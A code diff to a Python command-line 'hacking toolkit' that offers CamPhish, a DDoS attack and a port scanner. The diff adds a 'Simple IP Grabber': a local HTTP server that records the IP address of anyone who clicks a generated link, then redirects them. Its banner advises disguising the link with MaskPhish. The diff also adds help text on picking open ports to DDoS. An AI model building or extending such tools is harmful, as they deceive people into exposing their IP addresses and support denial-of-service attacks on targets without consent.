@@ -42,9 +42,10 @@ Make a Selection:
 4. CamPhish
 5. DDoS Attack
 6. Port Scanner
-7. Exit
+7. Simple IP Grabber
+8. Exit
 
--More feautures coming soon-
+-More features coming soon-
 mdsec-ver2.py (beta)
 ------------------------------------
 """
@@ -74,6 +75,9 @@ def ddos_function():
 ┳┓┳┓  ┏┓  ┏┓┏┳┓┏┳┓┏┓┏┓┓┏┓
 ┃┃┃┃┏┓┗┓  ┣┫ ┃  ┃ ┣┫┃ ┃┫ 
 ┻┛┻┛┗┛┗┛  ┛┗ ┻  ┻ ┛┗┗┛┛┗┛
+Tool which does a DDoS attack on a target IP.
+Use Port Scanner to find the port to attack on.
+(note - 'open ports' are the ones that can be attacked.)
     """
     print_centered(ddos_art)
     target_ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL)
@@ -94,6 +98,7 @@ def port_scanner():
 ┏┓┏┓┳┓┏┳┓  ┏┓┏┓┏┓┳┓┳┓┏┓┳┓
 ┃┃┃┃┣┫ ┃   ┗┓┃ ┣┫┃┃┃┃┣ ┣┫
 ┣┛┗┛┛┗ ┻   ┗┛┗┛┛┗┛┗┛┗┗┛┛┗
+Tool which scans for open and closed ports for IPs.
     """
     print_centered(port_scanner_art)
     print(Fore.LIGHTGREEN_EX + "Port Scanner" + Style.RESET_ALL)
@@ -117,7 +122,7 @@ def port_scanner():
 
     wait_for_user()
 
-# Class to handle IP Toolkit functionality
+# Class to handle Simple IP Grabber functionality
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         parsed_path = urlparse(self.path)
@@ -201,9 +206,69 @@ class IPToolkit:
                 return json.dumps(formatted_data, indent=4)
         except Exception as e:
             return f"Error retrieving geolocation data: {str(e)}"
+ipgrabber_art="""
+┏┓•     ┓    ┳┏┓  ┏┓    ┓ ┓     
+┗┓┓┏┳┓┏┓┃┏┓  ┃┃┃  ┃┓┏┓┏┓┣┓┣┓┏┓┏┓
+┗┛┗┛┗┗┣┛┗┗   ┻┣┛  ┗┛┛ ┗┻┗┛┗┛┗ ┛ 
+      ┛                         
+Tool which sends the IP of anyone clicking a generated link. (Use MaskPhish to make a natural looking link.)
+"""
 
 def wait_for_user():
     input(Fore.LIGHTYELLOW_EX + "Press Enter to continue..." + Style.RESET_ALL)
+
+def simple_ip_grabber():
+    clear_console()
+    print_centered("Starting Simple IP Grabber...")
+    print(Fore.RED+ipgrabber_art)
+
+    # Prompt for URL redirection
+    redirect_url = input(Fore.RED + "Enter the URL to redirect to (include http:// or https://): " + Style.RESET_ALL)
+    url_checker(redirect_url)
+
+    # Create the folder to store captured data
+    capture_folder = create_capture_folder()
+
+    # Automatically find a free port
+    port = find_free_port()
+
+    # Start the HTTP server with redirect URL
+    httpd = HTTPServer(('127.0.0.1', port), SimpleHTTPRequestHandler)
+    print_centered(f"IP Grabber is running! Visit http://127.0.0.1:{port} to grab IPs.")
+    print_centered(f"Redirecting to: {redirect_url}")
+
+    # Serve indefinitely
+    httpd.serve_forever()
+
+def url_checker(url):
+    try:
+        result = requests.get(url)
+        if result.status_code == 200:
+            print_centered("Valid URL!")
+        else:
+            print_centered("Invalid URL!")
+    except requests.exceptions.RequestException as e:
+        print_centered(f"Error: {e}")
+
+def create_capture_folder():
+    folder_name = "captured_ips"
+    if not os.path.exists(folder_name):
+        os.makedirs(folder_name)
+    return folder_name
+
+def find_free_port(start=8000):
+    port = start
+    while True:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            if s.connect_ex(('127.0.0.1', port)) != 0:
+                return port
+            port += 1
+toolkit_menu = """
+┳┏┓  ┏┳┓    ┓┓┏┓• 
+┃┃┃   ┃ ┏┓┏┓┃┃┫ ┓╋
+┻┣┛   ┻ ┗┛┗┛┗┛┗┛┗┗
+Useful tool that can geolocate private IPs.                  
+"""
 
 def main_menu():
     while True:
@@ -217,6 +282,7 @@ def main_menu():
             ip_toolkit = IPToolkit()
             ip_toolkit.get_local_ip()
             public_ip = ip_toolkit.get_public_ip()
+            print(Fore.RED+toolkit_menu)
             print(Fore.LIGHTGREEN_EX + ip_toolkit.get_latest_info() + Style.RESET_ALL)
 
             # Prompt for geolocation
@@ -243,6 +309,8 @@ def main_menu():
         elif choice == '6':
             port_scanner()
         elif choice == '7':
+            simple_ip_grabber()
+        elif choice == '8':
             print_centered("Exiting the application.")
             break
         else:
@@ -250,3 +318,4 @@ def main_menu():
 
 if __name__ == "__main__":
     main_menu()
+
